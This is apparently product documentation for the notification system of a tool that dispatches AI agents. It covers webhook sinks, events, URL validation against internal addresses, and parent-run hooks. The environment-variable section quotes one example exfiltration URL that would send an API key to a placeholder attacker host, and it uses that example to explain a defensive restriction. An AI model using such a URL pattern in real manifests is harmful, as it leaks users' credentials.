# Notifications

Pitboss can push notifications to external sinks when key run events occur. This is useful for monitoring long-running dispatches from outside the TUI — for example, getting a Slack message when a budget-intensive run finishes.

## Configuration

Add a `[[notification]]` section to your manifest for each sink:

```toml
[[notification]]
kind = "slack"
url = "${PITBOSS_SLACK_WEBHOOK_URL}"   # env-var substitution supported (prefix required, see below)
events = ["run_finished", "budget_exceeded"]
severity_min = "info"

[[notification]]
kind = "discord"
url = "${PITBOSS_DISCORD_WEBHOOK_URL}"
events = ["approval_request", "approval_pending", "run_finished"]

[[notification]]
kind = "webhook"
url = "https://my-server.example.com/pitboss-events"
events = ["approval_request", "budget_exceeded", "run_finished"]
```

The top-level field is `kind`, not `type`. TOML parses it literally — a `type = "slack"` line will be rejected with an `unknown field` error at validate time.

## Supported sinks

| Sink | `kind` value | Notes |
|------|-------------|-------|
| Generic HTTP POST | `"webhook"` | Sends a JSON payload with the event |
| Slack Incoming Webhook | `"slack"` | Formats as a Slack message block |
| Discord Webhook | `"discord"` | Formats as a Discord embed with severity-coded color, markdown-escaped fields, and `allowed_mentions: []` |
| Log only | `"log"` | Writes to stderr via `tracing`; useful for debugging + CI contexts where the operator watches logs |

## Events

| Event | Severity | When it fires |
|-------|---------|--------------|
| `approval_request` | Warning | An approval is enqueued for operator action (v0.6+) |
| `approval_pending` | Warning | An approval enqueues and awaits operator action with no TUI attached (v0.6+) — distinct from `approval_request` for alerting when a run is blocked |
| `run_dispatched` | Info | The dispatch starts, immediately after a `run_id` is minted (v0.10+) |
| `run_finished` | Info | The dispatch completes (all tasks settled or cancelled) |
| `budget_exceeded` | Critical | A `spawn_worker` or `spawn_sublead` fails due to budget exhaustion |

## Severity filtering

The optional `severity_min` field filters by the event's declared severity (not a per-sink override — each event has a fixed severity). Ordering is `info < warning < error < critical`. Default is `"info"` (emit everything).

For example, `severity_min = "warning"` on a Discord sink skips `run_finished` (Info) but delivers `approval_request` (Warning) and `budget_exceeded` (Critical).

## Delivery semantics

- Notifications fire asynchronously via `tokio::spawn` — they don't block the dispatch.
- Failed deliveries are retried up to 3 times with exponential backoff (100ms → 300ms → 900ms).
- An LRU dedup cache (size 64) prevents retry storms for the same event. Dedup key is `{run_id}:{event_kind}[:{discriminator}]` (discriminator is `request_id` for approval events, `"first"` for budget exceeded).
- Delivery failures are logged via `tracing::error!` with the sink id and dedup key. The dispatcher continues regardless — notification failures never fail a run.
- Per-attempt HTTP timeout: 30 seconds.

## Env-var substitution

URLs support `${PITBOSS_VAR_NAME}` substitution from the process environment. This keeps webhook URLs (which are themselves secrets — anyone with the URL can post to the channel) out of manifest files that might be committed to git:

```toml
[[notification]]
kind = "slack"
url = "${PITBOSS_SLACK_WEBHOOK_URL}"
events = ["run_finished"]
```

**As of v0.7.1, only env vars whose names start with `PITBOSS_` may be substituted.** This closes an exfiltration vector where a rogue manifest could write `url = "https://attacker/?t=${ANTHROPIC_API_KEY}"` and leak any host env var to a chosen webhook. Unprefixed names fail loudly at validate time rather than silently reaching through to `std::env::var`.

If you were using an unprefixed var name in older manifests, rename it in your shell init (or deployment config):

```bash
# Before
export SLACK_WEBHOOK_URL="https://hooks.slack.com/..."

# After (v0.7.1+)
export PITBOSS_SLACK_WEBHOOK_URL="https://hooks.slack.com/..."
```

## Webhook URL validation (v0.7.1+)

Beyond the env-var prefix, all `webhook` / `slack` / `discord` URLs are validated at manifest load:

- Scheme must be `https://`. `http://`, `file://`, and other non-https schemes are rejected.
- Host must not resolve to a loopback, private, link-local, unspecified, broadcast, CGNAT (`100.64.0.0/10`), IPv6 ULA (`fc00::/7`), or IPv6 link-local (`fe80::/10`) address. IPv4-mapped IPv6 (`::ffff:127.0.0.1`) is also rejected.
- Hostnames like `localhost` and `*.localhost` are blocked by name.

If you need to post to an internal service for development, the workaround is to route through a public relay (e.g. an ngrok tunnel) — pitboss will not speak directly to a private address.

## Discord sink: markdown and mention safety (v0.7.1+)

The Discord sink escapes markdown and mention characters (`* _ ~ \` `|` `> # [ ] ( ) @ < :`) in untrusted fields (`request_id`, `task_id`, `summary`, `run_id`, `source`) before embedding them in the Discord description. Each payload also sets `allowed_mentions: { parse: [] }` so Discord doesn't resolve `@everyone` / `@here` / user / role / channel mentions even if one sneaks past the escaping.

Slack sink parallel hardening is a known roadmap item — until it lands, avoid routing untrusted content (task summaries from external sources) through Slack.

For the canonical notification schema reference, see [`AGENTS.md`](https://github.com/SDS-Mode/pitboss/blob/main/AGENTS.md) in the source tree.

## Parent-orchestrator notify hook (v0.10+)

If you wrap pitboss in a host process (Discord bot, dispatcher service, CI runner) and you want visibility into runs the agent itself spawns from inside its task worktree (`pitboss dispatch <child.toml>`), set two env vars on the parent process — no manifest cooperation required:

```bash
export PITBOSS_PARENT_NOTIFY_URL=http://localhost:8080/pitboss-events
pitboss dispatch root-manifest.toml
```

`PITBOSS_PARENT_NOTIFY_URL`
: Every `pitboss dispatch` invocation (top-level AND any nested call from inside a worktree) builds an ephemeral webhook sink targeting this URL and emits at run start (`run_dispatched`) and run end (`run_finished`). Runs alongside any manifest-declared `[[notification]]` sinks. Loopback / private-address URLs are accepted here (the canonical orchestrator topology is `http://localhost:N` on the same host) — manifest URLs still go through the strict SSRF guard since a manifest is user-authored content; an env var can only be set by the operator.

`PITBOSS_RUN_ID`
: Set automatically by every `pitboss dispatch` to its own run uuid. Standard env-var inheritance propagates the value into spawned claude subprocesses; if the agent runs `pitboss dispatch <child.toml>` from inside its worktree, the nested invocation reads the inherited value and reports it as `parent_run_id` on the child's `run_dispatched` event so your orchestrator can correlate parent ↔ child runs. You don't need to set this yourself — pitboss does it for you.

Sample `run_dispatched` payload:

```json
{
  "dedup_key": "019d...:run_dispatched",
  "severity":  "info",
  "ts":        "2026-04-26T12:00:00Z",
  "source":    "019d...",
  "event": {
    "kind":          "run_dispatched",
    "run_id":        "019d...",
    "parent_run_id": "019c...",
    "manifest_path": "/work/child.toml",
    "mode":          "flat"
  }
}
```

`parent_run_id` is `null` for top-level dispatches.

## `[lifecycle]` section: surviving the parent (v0.10+)

A second control on the same orchestrator-visibility theme: the optional
`[lifecycle]` section lets a manifest formally declare that this dispatch
is allowed to outlive the process that spawned it. Use case: an agent's
`pitboss dispatch <child.toml>` from inside its task worktree needs to
keep running after the agent's lead claude exits or hits the orchestrator's
task timeout.

```toml
[lifecycle]
survive_parent = true
notify = { kind = "webhook", url = "https://orchestrator.internal/events", events = ["run_dispatched", "run_finished"] }
```

`survive_parent`
: Default `false` (matching pitboss's existing "dies with parent" posture). When set to `true`, the dispatcher communicates the intent via the `RunDispatched` event payload's `survive_parent` field — the orchestrator decides whether to exclude this run's process group from any cancel-tree-walk it performs.

`notify` (optional)
: Inline `[[notification]]`-style sink. Same shape and same SSRF rules (https-only, no loopback). When present, gets merged into the run's notification router alongside any top-level `[[notification]]` sections.

### Validate-time coupling

`pitboss validate` rejects `survive_parent = true` without a notification target. Either an inline `[lifecycle].notify` OR at least one top-level `[[notification]]` section satisfies the rule. The reasoning: an orchestrator that's losing process-level control of the run needs *some* signal that the run actually finished — a naked detachment with no out-of-band notify is the worst-orphan case the schema aims to prevent.

If you intend to deliver lifecycle events solely via `PITBOSS_PARENT_NOTIFY_URL`, declare a no-cost `kind = "log"` notification block to satisfy the validate gate (the env-var sink is configured at dispatch-time and validate cannot see it):

```toml
[lifecycle]
survive_parent = true

[[notification]]
kind = "log"
events = ["run_dispatched", "run_finished"]
```

### When to use which

| Case | Use |
|---|---|
| Loopback orchestrator on the same host | `PITBOSS_PARENT_NOTIFY_URL` env var (operator-trusted, bypasses SSRF guard) |
| HTTPS endpoint on a non-loopback host | `[lifecycle].notify` or `[[notification]]` with `kind = "webhook"` |
| Just want to cleanly outlive the parent | `[lifecycle].survive_parent = true` + any of the above |
